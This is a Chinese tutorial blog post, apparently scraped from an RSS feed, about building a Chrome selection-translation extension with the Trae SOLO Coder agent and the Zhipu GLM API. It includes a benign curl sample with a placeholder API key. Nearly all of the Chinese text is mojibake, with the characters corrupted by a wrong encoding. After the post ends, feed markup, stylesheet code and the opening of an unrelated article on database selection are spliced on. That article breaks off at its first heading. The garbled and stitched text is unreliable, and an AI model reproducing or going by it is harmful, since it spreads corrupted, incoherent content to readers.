<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4555a20a35d94412ac075c16113dde1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=H17sN3Na%2BrNp472T2i5k4P6dKbw%3D" alt="" loading="lazy"/></p>
<p>åªéœ€è¦æ³¨å†Œï¼Œå¹¶åˆ›å»º <code>API Key</code> å³å¯ã€‚</p>
<p>ä¹‹å‰æœ‰åˆ†äº«è¿‡ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ã€‚</p>
<h3 data-id="heading-4">åˆç‰ˆç”Ÿæˆ</h3>
<p><strong>æŒ‡ä»¤</strong></p>
<p>é™¤äº†è¯´æ˜æˆ‘è¦åšä»€ä¹ˆä¹‹å¤–ï¼Œé¢å¤–æ˜ç¡®äº†æŠ€æœ¯æ ˆé‡‡ç”¨æ™ºè°±APIï¼Œå¹¶ç»™å‡ºå®˜æ–¹æ–‡æ¡£ä¸­ cURL çš„ä»£ç ç¤ºä¾‹ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">æˆ‘è¦å®ç°ä¸€ä¸ªchrome æµè§ˆå™¨æ’ä»¶ï¼Œä¸»è¦å®ç°ç½‘ç«™é¡µé¢ä¸Šé€‰ä¸­å†…å®¹çš„ç¿»è¯‘ï¼Œç¿»è¯‘ç»“æœé€šè¿‡æµ®åŠ¨å¼¹çª—æ˜¾ç¤ºåœ¨é€‰ä¸­å†…å®¹ä¸Šæ–¹ã€‚

ç¿»è¯‘æ¥å£é‡‡ç”¨æ™ºè°±å¤§æ¨¡å‹apiï¼Œglm-<span class="hljs-number">4.5</span>-flashã€‚
curlç¤ºä¾‹å¦‚ä¸‹ï¼š
curl -X POST <span class="hljs-string">" https://open.bigmodel.cn/api/paas/v4/chat/completions "</span> \
-H <span class="hljs-string">"Content-Type: application/json"</span> \
-H <span class="hljs-string">"Authorization: Bearer &lt;ä½ çš„ API Key&gt; "</span> \
-d <span class="hljs-comment">'{</span>
<span class="hljs-string">"model"</span>: <span class="hljs-string">"glm-4.5"</span>,
<span class="hljs-string">"messages"</span>: [
{
<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
<span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½œä¸ºä¸€åè¥é”€ä¸“å®¶ï¼Œè¯·ä¸ºæˆ‘çš„äº§å“åˆ›ä½œä¸€ä¸ªå¸å¼•äººçš„å£å·"</span>
},
{
<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>,
<span class="hljs-string">"content"</span>: <span class="hljs-string">"å½“ç„¶ï¼Œè¦åˆ›ä½œä¸€ä¸ªå¸å¼•äººçš„å£å·ï¼Œè¯·å‘Šè¯‰æˆ‘ä¸€äº›å…³äºæ‚¨äº§å“çš„ä¿¡æ¯"</span>
},
{
<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
<span class="hljs-string">"content"</span>: <span class="hljs-string">"æ™ºè°±AI å¼€æ”¾å¹³å°"</span>
}
],
<span class="hljs-string">"thinking"</span>: {
<span class="hljs-string">"type"</span>: <span class="hljs-string">"enabled"</span>
},
<span class="hljs-string">"max_tokens"</span>: <span class="hljs-number">4096</span>,
<span class="hljs-string">"temperature"</span>: <span class="hljs-number">0.6</span>
}<span class="hljs-comment">'</span>
</code></pre>
<p><strong>è¿‡ç¨‹</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0df21a2164a4466b9e0ba5563eb94de7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=OufMdwOVmBt1uVwEHPC9h3%2FaKoA%3D" alt="" loading="lazy"/></p>
<p>å…ˆæ˜¯ç…§å¸¸ç”Ÿæˆæ–‡æ¡£ã€‚</p>
<p>ä¸å¾—ä¸å†æ¬¡æ„Ÿå¹ï¼Œè¿™ä¸ªæ–‡æ¡£å†…å®¹æ˜¯çœŸçš„è¯¦ç»†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/094a3f220c02472f95d3c66d0e0adc2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=yUAdohk%2BJ6KENXxjlZ6ekW3Gj9E%3D" alt="" loading="lazy"/></p>
<p>å¹¶ä¸”ï¼Œè¿˜éå¸¸é è°±çš„å¸®æˆ‘è®¾è®¡äº† API Key çš„å®‰å…¨å­˜å‚¨æ–¹æ¡ˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6adca9127d2347b0a239937a6e59ea99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=KszJlrxH5zQCwuQF2QKQ5XuLdu4%3D" alt="" loading="lazy"/></p>
<p>æ¯•ç«Ÿï¼Œæˆ‘ä¸€ä¸ªæµè§ˆå™¨æ’ä»¶å°ç™½ï¼Œå®ƒè¦ä¸å‘Šè¯‰æˆ‘ï¼Œæˆ‘è¿˜çœŸä¸çŸ¥é“æœ‰ä¸ª <code>Options</code> å¯ä»¥å¿«é€Ÿè®¾ç½®ã€‚</p>
<p>å†ç„¶åï¼Œç»™å‡ºäº†ç›¸å…³çš„å‚è€ƒé“¾æ¥ï¼Œæ–¹ä¾¿æˆ‘ä»¬äº†è§£æ ¸å¯¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7264464dba2748b78c4ec738c7730eec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=99TKeM3bzZ1SwsPZmgLfLauVP1c%3D" alt="" loading="lazy"/></p>
<p>ç¡®è®¤æ–‡æ¡£åï¼Œ<code>SOLO</code> å°±ç›´æ¥æŒ‰è®¡åˆ’ç”Ÿæˆäº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea40031c559f44eba3522747977350ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=amymafqW9QhftXANyL%2FyKktFJ4E%3D" alt="" loading="lazy"/></p>
<p><strong>ç»“æœ</strong></p>
<p>ä¹‹å‰ä½¿ç”¨è‡ªå·±ç†Ÿæ‚‰çš„æŠ€æœ¯æ ˆçš„æ—¶å€™ï¼Œæ‰§è¡Œæ€»ç»“ä¸€èˆ¬éƒ½æ˜¯å¾ˆå¿«æ‰«å®Œçš„ã€‚</p>
<p>ä»Šå¤©ï¼Œä¸Šæ‰‹ä¸€ä¸ªæ–°çš„é¢†åŸŸæ‰å‘ç°ï¼Œ<code>SOLO</code> ç»™å‡ºçš„æ€»ç»“ä¹Ÿéå¸¸è¯¦ç»†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34279d6119a5480fafd5360469658277~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=pbZHv7J7OwhMDZi8Ap8PGQivScA%3D" alt="" loading="lazy"/></p>
<p>æœ€ä¸»è¦çš„æ˜¯æ¥ä¸‹æ¥æˆ‘éœ€è¦å¦‚ä½•è°ƒè¯•ï¼Œä¹Ÿå¸®æˆ‘æŒ‡æ˜äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0e507336e864665b915e7844d0e3420~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=KpBMRzElk3131%2Bbz5%2Fc%2Bkk9Lg3M%3D" alt="" loading="lazy"/></p>
<p>æ­¤æ—¶ç”Ÿæˆä»£ç ç»“æ„å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/706aeac3451b49928a6e7f5a2d6ec46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=189f1GxRpLtf%2BO6KJ1GUDWqLOFQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">æœ¬åœ°è°ƒè¯•</h3>
<p>ä»£ç å·²ç»ç”Ÿæˆå®Œäº†ï¼Œä¸‹é¢æˆ‘ä»¬æŒ‰ç…§å‰é¢ <code>SOLO</code> ç»™å‡ºçš„æ­¥éª¤ï¼Œä¸€æ­¥æ­¥æ“ä½œå³å¯ã€‚</p>
<p><strong>ç¬¬ä¸€æ­¥</strong>ï¼Œæ‰“å¼€ <code>Chrome</code>ï¼Œåœ°å€æ è¾“å…¥ï¼š<code>chrome://extensions/</code>ï¼Œä½ å¯ä»¥é€šè¿‡æ’ä»¶ç®¡ç†èœå•è¿›å…¥ã€‚</p>
<p>ç„¶åæŒ‰ç…§ä¸‹å›¾çš„ç®­å¤´æŒ‡ç¤ºæ“ä½œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c9a2c615e95470fbe908f12815e43e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=l1ljIDiXbRZqCKwHQIkbZc38wzk%3D" alt="" loading="lazy"/></p>
<ol>
<li>å³ä¸Šè§’â€œDeveloper modeâ€ï¼Œæ‰“å¼€å¼€å‘è€…æ¨¡å¼ï¼›</li>
<li>å·¦ä¾§â€œLoad unpackedâ€ï¼Œé€‰æ‹©é¡¹ç›®è·Ÿè·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œæ’ä»¶ä¼šæ˜¾ç¤ºåœ¨å›¾ä¸­ä½ç½®ã€‚</li>
</ol>
<p><strong>ç¬¬äºŒæ­¥</strong>ï¼Œæ‰“å¼€<code>Options</code>ç•Œé¢ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a7316bd059e4cd4b4bcb0b2e2a33593~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=elvjzxdXVHqqZgY5yseuOrphDNg%3D" alt="" loading="lazy"/></p>
<p>è®¾ç½® <code>API Key</code>ï¼Œè¯·å¿½ç•¥è®¾ç½®é¡µé¢çš„ç®€é™‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90daf4c3423a491c94d4ca2ebaa7c5b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=J1itowaPRg%2BcU8EDR4hS1SetHT0%3D" alt="" loading="lazy"/></p>
<p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼Œåœ¨è‹±æ–‡ç½‘ç«™ä¸­é€‰æ‹©å†…å®¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b7f8a9d267645999215cf10b85fd43d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=3Y%2BATqbNyFUvb8n49DgSTOgPGbM%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡»â€œç¿»è¯‘â€ï¼ŒæŸ¥çœ‹æ•ˆæœã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc522558902040d0854030abbd45225c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=3VqagQDgEt%2FeCycLxHSpvEIysLM%3D" alt="" loading="lazy"/></p>
<p>å“¦è€¶ï¼Œç›´æ¥æˆåŠŸï¼</p>
<blockquote>
<p>å¦‚æœæœ‰è·Ÿç»ƒçš„ï¼Œæµ‹è¯•é“¾æ¥ï¼š<a href="https://docs.trae.ai/ide/what-is-trae?_lang=en" target="_blank" title="https://docs.trae.ai/ide/what-is-trae?_lang=en" ref="nofollow noopener noreferrer">docs.trae.ai/ide/what-isâ€¦</a></p>
</blockquote>
<h3 data-id="heading-6">ç•Œé¢ä¼˜åŒ–</h3>
<p>ä¸Šé¢å·²ç»å®ç°äº†ç¿»è¯‘æ•ˆæœï¼Œä½†æ˜¯ç•Œé¢æœ‰ç‚¹éš¾å—ã€‚</p>
<p>æ²¡æœ‰æœ‰æ•ˆåˆ©ç”¨å±å¹•å®½åº¦ï¼Œå¹¶ä¸”è¿˜é®æŒ¡äº†é€‰ä¸­çš„å†…å®¹ã€‚</p>
<p>ä¸ç”¨æ€¥ï¼Œæˆ‘ä»¬å†è¿½åŠ ä¸€æ¬¡å¯¹è¯ï¼Œä¾ç„¶æ˜¯ <code>SOLO Coder</code> æ™ºèƒ½ä½“ã€‚</p>
<p><strong>æŒ‡ä»¤</strong></p>
<pre><code class="hljs">æµ®çª—å®½åº¦å’Œé€‰ä¸­æ–‡å­—åŒå®½ï¼›
æµ®çª—å®šä½åº”è¯¥åœ¨é€‰ä¸­æ–‡å­—æ•´ä½“çš„ä¸‹æ–¹ï¼Œä¸è¦é®æŒ¡é€‰ä¸­æ–‡å­—ï¼›
ç‚¹å‡»å…³é—­åï¼Œåº”è¯¥æ¸…ç©ºç¿»è¯‘ç»“æœï¼Œå¹¶å¯å†æ¬¡è¿›è¡Œä¸‹æ¬¡ç¿»è¯‘ã€‚
</code></pre>
<p><strong>è¿‡ç¨‹</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17e5916f114947c090153b36d9364f8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=oay4OCVkNzmePECkqHS4WbY6Kek%3D" alt="" loading="lazy"/></p>
<p><strong>æ•ˆæœ</strong></p>
<p>å†æ¬¡æ‰“å¼€æ’ä»¶ç®¡ç†é¡µé¢ï¼Œåˆ é™¤â€œRemoveâ€åŸæœ‰ç‰ˆæœ¬çš„æ’ä»¶ï¼Œé‡æ–°â€œLoad unpackedâ€ï¼Œå†æ¬¡æµ‹è¯•ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53fdd00dd15b4ac6b9528a7fc4259b2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=IybYoTyQTpmzm%2FVQI%2FHLs6MjHlg%3D" alt="" loading="lazy"/></p>
<p>ç†è§£éå¸¸åˆ°ä½ï¼Œæ•ˆæœä¹Ÿå¾ˆå®Œç¾ï¼Œæ”¶å·¥ã€‚</p>
<h2 data-id="heading-7">å®è·µä½“ä¼š</h2>
<p>ä»Šå¤©å®ç°è¿™ä¸ªæ’ä»¶ï¼Œä¸€å…±èŠ±è´¹äº† 1 å°æ—¶ 40 åˆ†é’Ÿå·¦å³ï¼Œè¿™è¿˜åŒ…å«äº†é‡‡ç”¨ <code>SOLO Builder</code> æ™ºèƒ½ä½“æœªæˆåŠŸçš„æ—¶é—´ã€‚</p>
<h3 data-id="heading-8">Builder å’Œ Coder çš„æŒ‘é€‰</h3>
<p><code>SOLO Builder</code> é€‚åˆå‰ç«¯åº”ç”¨ï¼Œæ‰€ä»¥ï¼Œæˆ‘é¦–é€‰çš„å°±æ˜¯å®ƒï¼Œä½†æ•ˆæœä¸ä½³ã€‚</p>
<p>æˆ‘ä¿®å¤äº†3æ¬¡ä¹‹åï¼Œæ‰èƒ½è¿è¡Œï¼Œå¹¶ä¸”æ•ˆæœè¿˜ä¸æ˜¯å¾ˆå¥½ã€‚</p>
<p>äºæ˜¯ï¼Œæˆ‘æœæ–­æ¸…ç©ºä»£ç ï¼Œé‡æ–°å¼€å§‹ï¼Œå¹¶æ›´æ¢äº† <code>SOLO Coder</code>ã€‚</p>
<p>å¦‚ä¸Šæ‰€ç¤ºï¼Œä¸€æ¬¡è¿‡ï¼Œè¿™æ‰åƒ <code>SOLO</code> å˜›ã€‚</p>
<p>å°ä½“ä¼šï¼š<strong>ä¸€å®šè¦æ ¹æ®ä»»åŠ¡é€‰æ‹©åˆé€‚çš„æ¨¡å‹æˆ–è€…æ™ºèƒ½ä½“ï¼Œä¹Ÿè®¸å¯ä»¥äº‹åŠåŠŸå€å“¦ã€‚</strong></p>
<h3 data-id="heading-9">ä½¿ç”¨AIè¿”å›çš„åè¯</h3>
<p>â€œç•Œé¢ä¼˜åŒ–â€çš„å¯¹è¯ä¸­ï¼Œæˆ‘æ²¡æœ‰ä½¿ç”¨â€œåˆç‰ˆç”Ÿæˆâ€æç¤ºè¯ä¸­çš„â€œæµ®åŠ¨å¼¹çª—â€ï¼Œè€Œæ˜¯ä½¿ç”¨äº† AI ç”Ÿæˆçš„æ–‡æ¡£ä¸­çš„â€œæµ®çª—â€ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªå®è·µçš„å°æŠ€å·§ï¼Œ<strong>å°½é‡ä½¿ç”¨ AI è¿”å›çš„åè¯ï¼Œè¿™æ ·ï¼Œå®ƒå¯¹ä½ çš„æŒ‡ä»¤ç†è§£ä¼šæ›´åŠ åˆ°ä½</strong>ã€‚</p>
<h3 data-id="heading-10">å¤–éƒ¨APIè°ƒç”¨ä½¿ç”¨ç¤ºä¾‹ä»£ç </h3>
<p>æˆ‘ä»¬åœ¨å¼€å‘åº”ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç¢°åˆ°å¾ˆå¤šéœ€è¦è°ƒç”¨å¤–éƒ¨ API çš„æƒ…å†µã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠ API æ–‡æ¡£ç»™åˆ° AIï¼Œä½†æˆ‘æ›´å–œæ¬¢ç›´æ¥<strong>æŠŠå®˜ç½‘çš„æ ·ä¾‹ä»£ç ç»™åˆ° AI</strong>ã€‚</p>
<p>æ¯•ç«Ÿï¼Œè‡ªç„¶è¯­è¨€å®¹æ˜“å­˜åœ¨æ­§ä¹‰ï¼Œä»£ç å¾ˆå°‘æœ‰æ­§ä¹‰çš„ã€‚</p>
<h2 data-id="heading-11">ç»“è¯­</h2>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬ä»0å¼€å§‹ï¼Œå®ç°äº†ä¸€ä¸ªæµè§ˆå™¨æ’ä»¶çš„å¼€å‘ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œå°è¯•ã€‚</p>
<p>æœ‰äº† <code>SOLO</code>ï¼Œå®ç°è¿™äº›å°å·¥å…·ï¼ŒçœŸçš„åˆå¿«åˆçœå¿ƒã€‚</p>
<p>ä¸è¿‡ï¼Œè¿™ä¸ªæ’ä»¶ç›®å‰è¿˜ä»…ä»…æ˜¯åˆç‰ˆï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä¼šæŠŠæ›´å¤šå¥½ç”¨çš„ç‰¹æ€§åŠ è¿›å»ï¼Œå¸Œæœ›å¯ä»¥çœŸæ­£ç”¨èµ·æ¥ã€‚</p>
<p>ä¹Ÿæ¬¢è¿å¤§å®¶å…³æ³¨åç»­åˆ†äº«ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„æ•°æ®åº“é€‰å‹ï¼šé«˜å¯ç”¨ã€å…¨é“¾è·¯å®‰å…¨ä¸å¹³æ»‘æ›¿ä»£çš„æŠ€æœ¯å®è·µ]]></title>    <link>https://juejin.cn/post/7576223441683890239</link>    <guid>https://juejin.cn/post/7576223441683890239</guid>    <pubDate>2025-11-24T12:24:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576223441683890239" data-draft-id="7576223441683857471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„æ•°æ®åº“é€‰å‹ï¼šé«˜å¯ç”¨ã€å…¨é“¾è·¯å®‰å…¨ä¸å¹³æ»‘æ›¿ä»£çš„æŠ€æœ¯å®è·µ"/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2025-11-24T12:24:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºçš„çŸ³å¤´_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„æ•°æ®åº“é€‰å‹ï¼šé«˜å¯ç”¨ã€å…¨é“¾è·¯å®‰å…¨ä¸å¹³æ»‘æ›¿ä»£çš„æŠ€æœ¯å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºçš„çŸ³å¤´_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:24:59.000Z" title="Mon Nov 24 2025 12:24:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
